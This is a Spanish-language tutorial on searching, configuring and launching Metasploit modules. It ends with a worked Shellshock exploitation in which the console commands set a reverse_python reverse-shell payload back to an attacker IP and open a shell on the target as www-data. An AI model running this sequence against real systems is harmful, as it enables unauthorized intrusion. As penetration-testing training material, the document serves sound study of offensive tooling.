# Búsqueda, Configuración y Lanzamiento

Metasploit Framework es una herramienta indispensable para los profesionales de la ciberseguridad, y su eficacia radica en la vasta colección de **módulos** disponibles. Un módulo es una unidad de código autocontenida que realiza una tarea específica, desde la explotación de vulnerabilidades hasta la recolección de información. Para aprovechar al máximo esta plataforma, es crucial saber cómo buscar, entender y ejecutar estos módulos.

## 1. Tipos de Búsqueda de Módulos en Metasploit

Metasploit Framework proporciona una potente funcionalidad de búsqueda (`search`) que permite localizar módulos específicos dentro de su extensa base de datos. Esta capacidad es fundamental para identificar rápidamente los _exploits_, _payloads_ o herramientas auxiliares más adecuados para una situación determinada. La búsqueda se realiza utilizando una serie de **parámetros de filtrado** que permiten refinar los resultados.

|               |                                                                                                                                                                                    |                           |
| ------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------- |
| **Parámetro** | **Descripción**                                                                                                                                                                    | **Ejemplo de Uso**        |
| `name:`       | Filtra módulos por su **nombre** o una subcadena contenida en este.                                                                                                                | `search name:apache`      |
| `type:`       | Restringe la búsqueda a un **tipo de módulo específico** (ej., `exploit`, `auxiliary`, `payload`, `post`, `encoder`, `nops`, `evasion`).                                           | `search type:exploit`     |
| `platform:`   | Busca módulos compatibles con una **plataforma objetivo** determinada (ej., `windows`, `linux`, `android`, `php`, `multi`).                                                        | `search platform:windows` |
| `arch:`       | Filtra por la **arquitectura del sistema objetivo** (ej., `x86`, `x64`, `arm`, `armle`).                                                                                           | `search arch:x64`         |
| `author:`     | Muestra módulos desarrollados por un **autor** específico.                                                                                                                         | `search author:hdm`       |
| `cve:`        | Localiza módulos asociados a un **Identificador Común de Vulnerabilidades y Exposiciones (CVE)**.                                                                                  | `search cve:2020-1472`    |
| `edb:`        | Filtra por el **ID de Exploit-DB**, un repositorio de _exploits_ públicos.                                                                                                         | `search edb:12345`        |
| `ref:`        | Busca por **referencias externas específicas** de vulnerabilidades (ej., boletines de seguridad de Microsoft como `MS17-010`, o referencias a bases de datos de vulnerabilidades). | `search ref:MS17-010`     |
| `date:`       | Permite buscar módulos por su **fecha de publicación o modificación** (por año, mes o día).                                                                                        | `search date:2020`        |
| `rank:`       | Filtra por el **ranking de fiabilidad del _exploit_**, que indica su efectividad y estabilidad (ej., `excellent`, `good`, `normal`, `average`, `low`).                             | `search rank:excellent`   |

#### Ejemplo Práctico de Búsqueda Combinada

La combinación de múltiples parámetros permite afinar significativamente los resultados de la búsqueda:

```sh
msf > search type:exploit platform:windows cve:2017-0144
```

Este comando buscará específicamente **módulos de tipo _exploit_** que sean aplicables a la **plataforma Windows** y estén relacionados con la vulnerabilidad identificada como **CVE-2017-0144** (conocida por el _exploit_ EternalBlue).

## 2. Consejos para Optimizar Búsquedas Avanzadas

Para maximizar la eficiencia en la búsqueda de módulos dentro de Metasploit, considera las siguientes recomendaciones:

- **Independencia del Orden:** El orden en que especificas los parámetros de filtrado no afecta el resultado de la búsqueda.
- **Precisión Progresiva:** Incluir un mayor número de parámetros de búsqueda te llevará a resultados más específicos y relevantes, reduciendo el ruido.
- **Estrategia de Refinamiento:** Lo ideal es empezar con una búsqueda amplia y, si el volumen de resultados es excesivo, aplicar filtros adicionales de manera iterativa para afinar la selección.
- **Uso de `info` Después de la Búsqueda:** Una vez que encuentres algo interesante, el comando `info <número_o_nombre_del_módulo>` es indispensable para acceder a una descripción detallada, sus opciones configurables, los objetivos soportados y referencias adicionales.

# Ejecución de Módulos en Metasploit Framework

La operatividad efectiva dentro de Metasploit Framework depende de un ciclo de vida metodológico para la selección, configuración y ejecución de módulos. Este proceso estandarizado garantiza que todas las variables y parámetros requeridos sean definidos correctamente antes de lanzar un ataque, maximizando la probabilidad de éxito y minimizando la detección.
## 1. Análisis Preliminar del Módulo: El Comando `info`

Antes de cargar un módulo en el contexto de trabajo, es imperativo realizar una inspección detallada de sus características y requerimientos. El comando `info` es la herramienta designada para esta fase de reconocimiento.

Al ejecutar `info <nombre_del_módulo>`, se obtiene un volcado completo de metadatos críticos, entre los que destacan:

- **Name:** El nombre canónico del módulo.
    
- **Platform:** Los sistemas operativos sobre los que el módulo puede operar.
    
- **Arch:** Las arquitecturas de procesador compatibles (ej., `x86`, `x64`, `ARM`).
    
- **Rank:** Un indicador de la fiabilidad del exploit, clasificado desde `low` hasta `excellent`. Un `excellent` rank implica que el exploit es seguro, estable y no debería causar una denegación de servicio en el objetivo.
    
- **Provided by:** Los autores o contribuidores del módulo.
    
- **Basic options:** Los parámetros de configuración del módulo, como `RHOSTS` o `RPORT`.
    
- **Payload information:** El espacio disponible para el _payload_ y las restricciones asociadas.
    
- **Description:** Un resumen técnico del propósito del módulo y la vulnerabilidad que explota.
    
- **References:** Enlaces directos a identificadores CVE (Common Vulnerabilities and Exposures), avisos de seguridad (como los de Microsoft, `MSB`) y otras publicaciones técnicas que validan y documentan la vulnerabilidad.
    

### Ejemplo de Aplicación de `info`

Tras una búsqueda (`search`) de un exploit para la vulnerabilidad "Shellshock", se identifica el módulo `exploit/multi/http/apache_mod_cgi_bash_env_exec`. Para analizarlo, se ejecuta:

```sh
msf6 > info exploit/multi/http/apache_mod_cgi_bash_env_exec
```

La salida de este comando revelará las opciones que deben ser configuradas (`RHOSTS`, `TARGETURI`), los sistemas operativos objetivo (`linux`, `unix`, `osx`, etc.) y referencias a `CVE-2014-6271`.

## 2. Ciclo de Configuración y Lanzamiento del Módulo

Una vez validada la idoneidad de un módulo, se procede a su configuración y ejecución secuencial.

### Paso 1: Carga del Módulo (`use`)

El comando `use` carga el módulo seleccionado en el contexto actual del framework, preparando el entorno para la configuración.

```sh
msf6 > use exploit/multi/http/apache_mod_cgi_bash_env_exec
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) >
```

El _prompt_ de la consola cambia para reflejar el módulo activo, permitiendo un acceso directo a sus parámetros específicos.

### Paso 2: Visualización de Parámetros (`show options`)

El comando `show options` lista todas las variables configurables del módulo, indicando su estado actual y si su configuración es obligatoria.

|Columna|Descripción|
|---|---|
|**Name**|El nombre de la variable (ej., `RHOSTS`).|
|**Current Setting**|El valor actualmente asignado.|
|**Required**|`yes` si el parámetro es obligatorio; `no` si es opcional.|
|**Description**|Una breve explicación del propósito del parámetro.|

### Paso 3: Asignación de Parámetros (`set`)

El comando `set` se utiliza para asignar valores a las variables del módulo. Los parámetros más comunes son:

- **`RHOSTS` (Remote Hosts):** La dirección IP o el rango de direcciones de los sistemas objetivo.
    
- **`RPORT` (Remote Port):** El puerto en el que el servicio vulnerable está escuchando en el objetivo.
    
- **`LHOST` (Local Host):** La dirección IP de la máquina atacante. Es fundamental para _payloads_ de tipo _reverse shell_, ya que indica al objetivo dónde debe conectarse de vuelta.
    
- **`LPORT` (Local Port):** El puerto en la máquina atacante que escuchará la conexión entrante del _payload_.
    
- **`TARGETURI`:** La ruta específica de un recurso vulnerable en un servidor web.
    

### Paso 4: Selección del Payload (`set payload`)

Un _exploit_ es el vector que aprovecha la vulnerabilidad, pero el **payload** es el código que se ejecuta en el sistema comprometido.

- Para listar los _payloads_ compatibles con el _exploit_ actual, se utiliza `show payloads`.
    
- La selección se realiza con `set payload <nombre_del_payload>`.
    

Existen diferentes tipos de _payloads_, como `reverse_tcp` (el objetivo se conecta al atacante) o `bind_tcp` (el atacante se conecta a un puerto abierto por el _payload_ en el objetivo).

### Paso 5: Verificación de Vulnerabilidad (`check`)

Antes de lanzar el _exploit_, una buena práctica es utilizar el comando `check`. Este comando intenta verificar de forma no intrusiva si el objetivo es vulnerable, sin ejecutar el _payload_. Ayuda a confirmar la viabilidad del ataque y a evitar fallos innecesarios.

### Paso 6: Ejecución del Módulo (`exploit` o `run`)

El comando `exploit` (o su alias `run`) inicia la ejecución del módulo con la configuración especificada. Si la explotación es exitosa, el _payload_ se ejecutará, y Metasploit notificará el establecimiento de una nueva sesión.

## 3. Ejemplo Práctico Integrado: Explotación de Shellshock (`CVE-2014-6271`)

Este escenario simula un ataque completo contra un servidor web Apache vulnerable a Shellshock.

**1. Carga del Módulo:**

```shell
msf6 > use exploit/multi/http/apache_mod_cgi_bash_env_exec
```

**2. Configuración de Parámetros:**

```shell
# Asignar la IP del servidor web objetivo
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set RHOSTS 10.10.12.150

# Asignar la ruta del script CGI vulnerable
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set TARGETURI /cgi-bin/vulnerable.sh

# Asignar la IP de nuestra máquina para la conexión inversa
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set LHOST 10.10.1.25

# Seleccionar un payload de línea de comandos para Unix
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set payload cmd/unix/reverse_python
payload => cmd/unix/reverse_python
```

**3. Verificación Final:**

```shell
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > show options
# Se confirma que RHOSTS, TARGETURI, LHOST y LPORT (asignado por defecto) están configurados.
```

**4. Lanzamiento del Exploit:**

```shell
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > exploit

[*] Started reverse TCP handler on 10.10.1.25:4444
[*] Command shell session 1 opened (10.10.1.25:4444 -> 10.10.12.150:48322) at 2024-10-27 15:30:00 -0500

$ whoami
www-data
$
```

La aparición del mensaje `Command shell session 1 opened` y el cambio del _prompt_ a `$` o `#` confirman que se ha obtenido una sesión de línea de comandos en el sistema objetivo con los privilegios del servicio web (`www-data`).
